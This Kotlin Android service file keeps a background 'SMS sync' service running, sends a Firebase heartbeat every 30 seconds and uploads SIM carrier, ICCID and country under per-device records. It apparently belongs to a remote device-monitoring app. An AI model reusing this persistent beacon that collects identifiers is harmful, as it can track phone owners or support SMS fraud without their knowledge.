package com.admin.legend

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import java.util.*

class SmsSyncService : Service() {

    private val NOTIFICATION_ID = 1
    private val CHANNEL_ID = "LegendSync"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        sendOnlineStatus()
        sendSimInfo()
        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() { sendOnlineStatus() }
        }, 0, 30_000)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "SMS Sync", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Legend Active")
            .setContentText("Syncing SMS in background")
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .build()
    }

    private fun sendOnlineStatus() {
        val db = FirebaseDatabase.getInstance()
        val deviceId = getDeviceId()
        val ref = db.getReference("devices/$deviceId")
        ref.child("online").setValue(true)
        ref.child("last_active_time").setValue(ServerValue.TIMESTAMP)
        ref.child("device_id").setValue(deviceId)
        ref.onDisconnect().child("online").setValue(false)
    }

    private fun sendSimInfo() {
        val simInfo = mutableListOf<Map<String, String>>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val subManager = getSystemService(SubscriptionManager::class.java)
            val subs = subManager.activeSubscriptionInfoList
            if (!subs.isNullOrEmpty()) {
                for ((i, sub) in subs.withIndex()) {
                    simInfo.add(mapOf(
                        "slot" to "${i+1}",
                        "carrier" to (sub.carrierName?.toString() ?: "Unknown"),
                        "iccid" to (sub.iccId ?: "N/A"),
                        "country" to (sub.countryIso ?: "N/A")
                    ))
                }
            }
        }
        val db = FirebaseDatabase.getInstance()
        val deviceId = getDeviceId()
        db.getReference("devices/$deviceId/sim_info").setValue(simInfo)
    }

    private fun getDeviceId(): String {
        val p = getSharedPreferences("legend", Context.MODE_PRIVATE)
        var id = p.getString("device_id", null)
        if (id == null) {
            id = UUID.randomUUID().toString()
            p.edit().putString("device_id", id).apply()
        }
        return id
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
}
